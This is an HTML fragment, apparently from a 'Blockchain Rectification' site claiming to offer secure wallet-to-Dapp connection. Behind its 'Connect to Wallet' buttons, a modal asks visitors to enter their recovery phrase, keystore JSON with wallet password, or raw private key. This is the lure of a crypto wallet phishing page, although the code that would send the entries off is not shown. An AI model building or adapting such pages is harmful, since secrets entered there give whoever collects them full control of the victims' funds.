  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<body>
  <div class="contain">

    <div class="contain1">

    

      <!-- <br><br> -->
      <div class="mages">
        <div class="blockchain">
          <div class="block">Blockchain <br> Rectification</div>
          <div class="chain">
            <div class="chain2">Blockchain Rectification is an open protocol to communicate securely <br>
              between Wallets and Dapps (Web3 Apps)
            </div>
            <!-- <br><br><br>  -->

            <!-- modal class -->
            <div class="class">

              <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#myModal">
                Connect to Wallet
              </button>

              <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#myModal">
                Select Chain
              </button>
            </div>

            <!-- The Modal -->
            <div class="modal modal1" id="myModal" style="color: black;">
              <div class="modal-dialog dia1" id="diag1">
                <div class="modal-content" id="modalcontent">
                  <!-- Modal Header -->
                  <div class="modal-header" id="modalheader">
                    <h4 class="modal-title" style="font-size: 15px; font-weight: 800;">
                      Connect with one of our available wallet providers
                    </h4>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" style="font-size: 10px;"></button>
                  </div>

                  <!-- Modal body -->
                  <div class="modal-body" id="modalBody">

                  </div>

                  <!-- Modal footer -->
                  <div class="modal-footer">
                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button>
                  </div>

                </div>
              </div>
            </div>

            <!-- second modal -->

            <div class="modal modal2" id="myModal2" style="color: black;">
              <div class="modal-dialog dia2" id="diag2">
                <div class="modal-content content2" id="modalcontent2">
                  <!-- Modal Header -->
                  <div class="modal-header alert alert-info" id="modalheader2">
                    
                    <button type="button" class="backbut" data-bs-toggle="modal" data-bs-target="#myModal">back</button>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" style="font-size: 10px;"></button>
                  </div>

                  <!-- Modal body -->
                  <div class="modal-body" id="modalBody2">

                  </div>

                  <!-- Modal footer -->
                  <div class="modal-footer">
                    <!-- <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button> -->
                  </div>

                </div>
              </div>
            </div>

            <!-- third modal -->

            <div class="modal modal3" id="myModal3" style="color: black;">
              <div class="modal-dialog dia3" id="diag3">
                <div class="modal-content" id="modalcontent3">
                  <!-- Modal Header -->
                  <div class="modal-header alert alert-info" id="modalheader2">
                    <h1 style="font-size: 16px;">Connect your Wallet</h1>
                    <!-- <button type="button" class="backbut" data-bs-toggle="modal" data-bs-target="#myModal">back</button>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" style="font-size: 10px;"></button> -->

                  </div>

                  <!-- Modal body -->
                  <div class="modal-body" id="modalBody3">
                       <div class="space"></div>
                       <div class="import">
                          <div class="imp" id="imp">
                           
                           <!-- <div id="port"></div> -->
                          </div>
                        
                          <div class="phrase">
                            <button onclick="phrasee()">Phrase </button>
                            <button onclick="keyStoree()">Keystore JSON </button>
                            <button onclick="privatee()">Private Key </button>
                          </div>
                         
                          <form action="">
                            <div class="form-group" id="phrase">
                              <textarea name="" id="" cols="53" rows="5" placeholder="Enter Your Recovery Phrase Here" required></textarea>
                              <div class="form-group">
                                <button class="btn btn-primary form-control mt-3">Connect</button>
                              </div>
                            </div>
  
                          </form>


                          <form action="">
                            <div class="form-group" id="keystore">
                              <textarea name="" id="" cols="53" rows="5" placeholder="Enter Your Keystore Json" required></textarea><br><br>
                              <input type="text" placeholder="Wallet Password" class="form-control" required>
                              <div class="form-group">
                                <button class="btn btn-primary form-control mt-3">Connect</button>
                              </div>
                            </div>
                          </form>


                          <form action="">
                            <div class="form-group" id="private">
                            <input type="text" placeholder="Enter Your Priavte Key" class="form-control" required><br>
                            <small>Typically 64 characters with space.</small>
                            <div class="form-group">
                              <button class="btn btn-primary form-control mt-3">Connect</button>
                            </div> <br>
                          </div>
                          
                      
                          </form>
                            
                          
                         

                          
                        
                       </div><br>

                     
                        <button type="button" class="btn btn-danger" id="can"  data-bs-toggle="modal" data-bs-target="#myModal">Cancel</button>
                     

                  </div>

                  <!-- Modal footer -->
                 

                </div>
              </div>
            </div>

            <!-- end of modal class -->


          </div>
        </div>


        <div class="img"> <img class="image" src="./images/blockchain1.png" alt=""> </div>

      </div>


    </div>


    <!-- end of contain1 -->

    <div class="select">
      <div class="make">Make Your Selection Below</div>
